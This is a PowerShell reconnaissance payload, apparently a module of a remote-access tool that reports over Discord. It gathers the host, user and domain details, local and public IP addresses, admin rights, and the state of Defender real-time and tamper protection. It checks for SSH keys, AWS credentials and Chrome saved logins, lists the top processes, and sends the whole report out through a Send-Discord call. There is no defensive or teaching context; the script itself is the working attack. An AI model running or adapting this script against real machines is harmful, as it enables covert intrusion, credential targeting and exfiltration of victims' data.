# ============================================================
# Full Reconnaissance for Windows - Modular Remote Payload
# ============================================================

$sysid = Get-SystemID
$output = "🔍 **FULL RECON - $sysid**`n"
$output += "📅 $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n"
$output += "=" * 40 + "`n`n"

# System
$output += "**💻 SYSTEM**`n"
$output += "• Hostname: ``$env:COMPUTERNAME```n"
$output += "• User: ``$env:USERNAME```n"
$output += "• Domain: ``$env:USERDOMAIN```n"
$os = (Get-WmiObject Win32_OperatingSystem).Caption
$output += "• OS: ``$os```n"
$arch = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
$output += "• Arch: ``$arch```n`n"

# Network
$output += "**🌐 NETWORK**`n"
$localIPs = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike '*Loopback*' }).IPAddress -join ', '
$output += "• Local: ``$localIPs```n"
try {
    $pubIP = (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 5)
    $output += "• Public: ``$pubIP```n"
} catch {}
$output += "`n"

# Privileges
$output += "**🔐 PRIVILEGES**`n"
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
$output += "• Admin: $(if ($isAdmin) { '✅ Yes' } else { '❌ No' })`n"
$output += "`n"

# Security
$output += "**🛡️ SECURITY**`n"
try {
    $defender = Get-MpComputerStatus
    $output += "• Defender RTP: $(if ($defender.RealTimeProtectionEnabled) { '✅ On' } else { '❌ Off' })`n"
    $output += "• Tamper Protection: $(if ($defender.IsTamperProtected) { '✅ On' } else { '❌ Off' })`n"
} catch {
    $output += "• Defender: Unable to query`n"
}
$output += "`n"

# Interesting files
$output += "**📁 INTERESTING**`n"
if (Test-Path "$env:USERPROFILE\.ssh") { $output += "• SSH Keys: ✅`n" }
if (Test-Path "$env:USERPROFILE\.aws") { $output += "• AWS Creds: ✅`n" }
if (Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data") { $output += "• Chrome Logins: ✅`n" }
$output += "`n"

# Running processes
$output += "**⚙️ TOP PROCESSES**`n"
$procs = Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 Name, CPU
foreach ($p in $procs) {
    $output += "• $($p.Name): $([math]::Round($p.CPU, 1))s CPU`n"
}

Send-Discord $output
